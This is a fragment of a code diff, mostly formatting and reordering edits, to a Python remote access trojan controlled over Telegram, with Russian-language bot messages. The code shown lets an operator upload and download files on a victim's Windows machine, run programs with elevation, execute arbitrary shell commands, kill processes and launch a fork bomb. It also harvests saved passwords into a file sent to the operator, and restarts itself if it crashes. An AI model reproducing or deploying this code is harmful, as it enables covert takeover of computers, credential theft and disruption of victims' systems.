-     'Удалено *' + str(c) + '* файлов из *' + str(a) + '*!'
+     'Удалено *'+str(c)+'* файлов из *'+str(a)+'*!'
      '\n'
-     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
-     '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
+     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0))+
+     '\nСодержало » '+"{:,} Файлов, {:,} Папок".format(files, folders),
      parse_mode="Markdown")
  except:
   pass
@@ -700,13 +785,12 @@ def removeall(command):
 def upload(command):
  try:
   msg = re.split('/Upload ', command.text, flags=re.I)[1]
-  url = msg
-  req = urllib.request.Request(url, method='HEAD')
+  req = urllib.request.Request(msg, method='HEAD')
   r = urllib.request.urlopen(req)
-  file_name = os.environ['ProgramData'] + '\\Files\\' + r.info().get_filename()
+  file_name = os.environ['ProgramData']+'\\Files\\'+r.info().get_filename()
   bot.send_message(command.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
-  urllib.request.urlretrieve(url, file_name)
-  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`' + file_name + '`', parse_mode="Markdown")
+  urllib.request.urlretrieve(msg, file_name)
+  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`'+file_name+'`', parse_mode="Markdown")
  except urllib.error.HTTPError as err:
   bot.send_message(command.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
  except ValueError:
@@ -720,10 +804,10 @@ def document(command):
   file_info = bot.get_file(command.document.file_id)
   bot.send_message(command.chat.id, '*Загружаем...*', parse_mode="Markdown")
   downloaded_file = bot.download_file(file_info.file_path)
-  src = os.environ['ProgramData'] + '\\Files\\'+file_info.file_path;
+  src = os.environ['ProgramData']+'\\Files\\'+file_info.file_path;
   with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
-  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
+  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`C:/ProgramData/Files/'+file_info.file_path+'`', parse_mode="Markdown")
  except FileNotFoundError:
   bot.reply_to(command, '*Формат файла не поддерживается*', parse_mode="Markdown")
  except:
@@ -733,7 +817,7 @@ def document(command):
 def download(command):
  try:
   msg = re.split('/Download ', command.text, flags=re.I)[1]
-  download = open(os.getcwd() + '\\' + msg, 'rb')
+  download = open(os.getcwd()+'\\'+msg, 'rb')
   bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
   bot.send_chat_action(command.chat.id, 'upload_document')
   bot.send_document(command.chat.id, download)
@@ -741,52 +825,52 @@ def download(command):
   bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
   try:
-    msg = re.split('/Download ', command.text, flags=re.I)[1]
-    bot.send_message(command.chat.id, '*Собираем...*', parse_mode="Markdown")
-    shutil.make_archive(os.environ['ProgramData'] + msg,
-                            'zip',
-                            os.getcwd(),
-                            msg)
-    bot.send_chat_action(command.chat.id, 'upload_document')
-    file = open(os.environ['ProgramData'] + msg + '.zip', 'rb')
-    bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
-    bot.send_document(command.chat.id, file)
-    file.close()
-    os.remove(os.environ['ProgramData'] + msg + '.zip')
+   msg = re.split('/Download ', command.text, flags=re.I)[1]
+   bot.send_message(command.chat.id, '*Собираем...*', parse_mode="Markdown")
+   shutil.make_archive(os.environ['ProgramData']+'\\'+msg,
+                           'zip',
+                           os.getcwd(),
+                           msg)
+   bot.send_chat_action(command.chat.id, 'upload_document')
+   file = open(os.environ['ProgramData']+msg+'.zip', 'rb')
+   bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
+   bot.send_document(command.chat.id, file)
+   file.close()
+   os.remove(os.environ['ProgramData']+msg+'.zip')
   except PermissionError:
-  	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-    try:
-        file.close()
-        os.remove(os.environ['ProgramData'] + msg + '.zip')
-        bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
-    except:
-        bot.send_message(command.chat.id, '*Введите название файла\n\n› /Download*', parse_mode="Markdown")
+   try:
+    file.close()
+    os.remove(os.environ['ProgramData']+msg+'.zip')
+    bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
+   except:
+    bot.send_message(command.chat.id, '*Введите название файла\n\n› /Download*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['Run', 'run'])
 def run(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/Run ', command.text, flags=re.I)[1]
-  os.startfile(os.getcwd() + '\\' + msg)
-  bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  os.startfile(os.getcwd()+'\\'+msg)
+  bot.send_message(command.chat.id, 'Файл *'+msg+'* открыт!', parse_mode="Markdown")
  except FileNotFoundError:
- 	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
- 	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['RunAS', 'runas'])
 def runas(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/RunAS ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   while True:
    try:
-    os.startfile(os.getcwd() + '\\' + msg, 'runas')
+    os.startfile(os.getcwd()+'\\'+msg, 'runas')
    except:
    	pass
    else:
-    bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
+    bot.send_message(command.chat.id, 'Файл *'+msg+'* открыт!', parse_mode="Markdown")
     break
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
@@ -796,21 +880,20 @@ def runas(command):
 @bot.message_handler(regexp='/Tasklist')
 def tasklist(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
   pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]
   pr_string = '\n'.join(pr_list)
-  bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '`'+pr_string+'`', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Не удалось получить список процессов*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Taskkill')
 def taskkill(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/Taskkill ', command.text, flags=re.I)[1]
-  subprocess.Popen('taskkill /f /im ' + msg + '.exe')
-  bot.send_message(command.chat.id, 'Процесс *' + msg + "* остановлен!", parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  subprocess.Popen('taskkill /f /im '+msg+'.exe')
+  bot.send_message(command.chat.id, 'Процесс *'+msg+"* остановлен!", parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, 
   '*Введите название процесса'
@@ -819,14 +902,14 @@ def taskkill(command):
   '\n'
   '\nАктивное окно*'
   '\n'
-  '\n`' + GetWindowText(GetForegroundWindow()) + '`',
+  '\n`'+GetWindowText(GetForegroundWindow())+'`',
   reply_markup=main6, parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Message')
 def message(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/Message ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   bot.reply_to(command, '*Сообщение отправленно!*', parse_mode="Markdown")
   ctypes.windll.user32.MessageBoxW(0, msg, u'', 0x10)
  except:
@@ -835,62 +918,57 @@ def message(command):
 @bot.message_handler(regexp='/OpenURL')
 def openurl(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/OpenURL ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   webbrowser.open_new_tab(msg)
   bot.reply_to(command, '*Ссылка открыта!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Вставьте ссылку\n\n› /OpenURL*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
-def wallpapers(command):
- bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")
 
 @bot.message_handler(content_types=['photo'])
 def wallpapers(command):
  try:
   file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
   downloaded_file = bot.download_file(file_info.file_path)
-  src = os.environ['ProgramData'] + '\\Files\\' + file_info.file_path;
+  src = os.environ['ProgramData']+'\\Files\\'+file_info.file_path;
   with open(src, 'wb') as new_file:
     new_file.write(downloaded_file)
-  ctypes.windll.user32.SystemParametersInfoW(20, 0, os.environ['ProgramData'] + '\\Files\\' + file_info.file_path, 0)
+  ctypes.windll.user32.SystemParametersInfoW(20, 0, os.environ['ProgramData']+'\\Files\\'+file_info.file_path, 0)
   bot.reply_to(command, '*Фотография установлена на обои!*', parse_mode="Markdown")
   time.sleep(3)
-  os.remove(os.environ['ProgramData'] + '\\Files\\' + file_info.file_path)
+  os.remove(os.environ['ProgramData']+'\\Files\\'+file_info.file_path)
  except:
   bot.reply_to(command, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")
-
-@bot.message_handler(regexp='/Voice')
-def voice(command):
- bot.send_chat_action(command.chat.id, 'typing')
- bot.send_message(command.chat.id, '*Введите текст\n\n› /Say*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Say')
 def say(command):
  try:
   from win32com.client import constants, Dispatch
-  bot.reply_to(command, '*Воспроизводим...*', parse_mode="Markdown")
   msg = re.split('/Say ', command.text, flags=re.I)[1]
-  devices = AudioUtilities.GetSpeakers()
-  interface = devices.Activate(
-      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-  volume = cast(interface, POINTER(IAudioEndpointVolume))
-  volume.SetMasterVolumeLevel(-0.0, None)
-  speaker = Dispatch("SAPI.SpVoice")
-  speaker.Speak(msg)
-  del speaker
-  bot.send_message(command.chat.id, '*Готово!*', parse_mode="Markdown")
+  bot.reply_to(command, '*Воспроизводим...*', parse_mode="Markdown")
+  try:
+   devices = AudioUtilities.GetSpeakers()
+   interface = devices.Activate(
+       IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+   volume = cast(interface, POINTER(IAudioEndpointVolume))
+   volume.SetMasterVolumeLevel(-0.0, None)
+   speaker = Dispatch("SAPI.SpVoice")
+   speaker.Speak(msg)
+   del speaker
+   bot.send_message(command.chat.id, '*Готово!*', parse_mode="Markdown")
+  except:
+   bot.send_message(command.chat.id, '*Не удалось воспроизвести текст*', parse_mode="Markdown")
  except:
-  pass
+  bot.send_message(command.chat.id, '*Введите текст\n\n› /Say*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/ForkBomb')
 def forkbomb(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Форкбомба активирована!*', parse_mode="Markdown")
  try:
   while True:
-  	os.startfile('cmd.exe')
+   os.startfile('cmd.exe')
+   os.startfile('calc.exe')
+   os.startfile('notepad.exe')
  except:
   pass
 
@@ -1019,7 +1097,7 @@ def passwords(command):
                   return None
 
       def save_passwords(self):
-          with open(os.environ['ProgramData'] + '\\Passwords.txt','w',encoding='utf-8') as f:
+          with open(os.environ['TEMP']+'\\Passwords.txt','w',encoding='utf-8') as f:
               f.writelines(self.passwordList)
 
   if __name__=="__main__":
@@ -1028,20 +1106,20 @@ def passwords(command):
       Main.save_passwords()
       try:
        bot.send_chat_action(command.chat.id, 'upload_document')
-       passwords = open(os.environ['ProgramData'] + '\\Passwords.txt')
+       passwords = open(os.environ['TEMP'] + '\\Passwords.txt')
        bot.send_document(command.chat.id, passwords)
        passwords.close()
-       os.remove(os.environ['ProgramData'] + '\\Passwords.txt')
+       os.remove(os.environ['TEMP']+'\\Passwords.txt')
       except:
        pass
  except:
- 	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Clipboard')
 def clipboard(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/Clipboard ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   pyperclip.copy(msg)
   bot.send_message(command.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
  except:
@@ -1052,14 +1130,14 @@ def clipboard(command):
   '\n'
   '\nБуфер обмена*'
   '\n'
-  '\n« `' + pyperclip.paste() + '` »',
+  '\n`'+pyperclip.paste()+'`',
   parse_mode="Markdown")
 
 @bot.message_handler(regexp='/CMD')
 def cmd(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/CMD ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   ipconfig_res = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
   lines = []
   for line in ipconfig_res.stdout.readlines():
@@ -1071,7 +1149,7 @@ def cmd(command):
   bot.send_message(command.chat.id, '*Введите команду\n\n› /CMD*', parse_mode="Markdown")
 
 try:
-  bot.polling()
+ bot.polling()
 except:
-  os.startfile(sys.argv[0])
-  sys.exit()
+ os.startfile(sys.argv[0])
+ sys.exit()
